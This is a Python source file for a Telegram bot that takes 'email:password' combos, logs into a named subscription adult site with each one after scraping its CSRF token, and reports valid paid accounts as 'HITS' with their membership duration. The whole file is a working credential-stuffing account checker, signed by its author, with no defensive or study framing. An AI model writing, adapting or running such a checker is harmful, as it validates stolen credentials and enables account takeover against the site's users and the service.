import requests
import time

def process_nubile_command(bot, message):
    chat_id = message.chat.id
    account_data = message.text.split()[1:]  # Get the account data from the command
    if account_data:
        total_accounts = len(account_data)
        start_time = time.time()
        results = []
        initial_message = "↯ NUBILES ACCOUNT\n\n"
        msg = bot.send_message(chat_id, initial_message + get_footer_info(total_accounts, start_time, message.from_user.username))

        for account in account_data:
            result = check_nubile_account(account)
            results.append(f"Combo: {account}\nResult => {result}")
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=msg.message_id,
                text=initial_message + "\n\n".join(results) + "\n\n" + get_footer_info(total_accounts, start_time, message.from_user.username)
            )

    else:
        bot.send_message(chat_id, "Please provide account details in the format: /nubile email:password")

def check_nubile_account(account):
    email, password = account.split(':')
    login_url = "https://nubiles-porn.com/login"
    headers = {
        "Host": "nubiles-porn.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Te": "trailers",
        "Connection": "close"
    }
    
    session = requests.Session()
    response = session.get(login_url, headers=headers)
    
    token = get_token(response.text)
    if not token:
        return "Failed to retrieve CSRF token"

    data = {
        "username": email,
        "password": password,
        "sign-in": "",
        "r": "members.nubiles-porn.com",
        "csrf-token": token
    }
    
    login_response = session.post("https://nubiles-porn.com/authentication/login", headers=headers, data=data)
    
    if "The username or password you've entered is incorrect or blocked" in login_response.text:
        return "Incorrect Email OR Password❌"

    if "Your subscription has expired" in login_response.text:
        return "Subscription Expired❌"
    
    account_response = session.get("https://members.nubiles-porn.com/account", headers=headers)
    membership_duration = get_membership_duration(account_response.text)
    
    if membership_duration:
        return f"HIT SUCCESSFULLY\nMembership Duration: {membership_duration} Days"
    else:
        return "Failed to retrieve account information"

def get_token(response_text):
    start = 'name="csrf-token" value="'
    end = '"'
    return get_str(response_text, start, end)

def get_membership_duration(response_text):
    import re
    pattern = re.compile(r'Membership Duration<\/label>.*?value="(.*?)">')
    match = pattern.search(response_text)
    if match:
        return match.group(1)
    return None

def get_str(string, start, end):
    str_ = string.split(start)
    if len(str_) > 1:
        str_ = str_[1].split(end)
        return str_[0]
    return ""

def get_footer_info(total_accounts, start_time, username):
    elapsed_time = time.time() - start_time
    footer = (
        f"－－－－－－－－－－－－－－－－\n"
        f"⌧ Total ACCOUNT Checked - {total_accounts}\n"
        f"⌧ Time Taken - {elapsed_time:.2f} seconds\n"
        f"⌧ Checked by: {username}\n"
        f"⚡️ Bot by - AFTAB [BOSS]\n"
        f"－－－－－－－－－－－－－－－－"
    )
    return footer
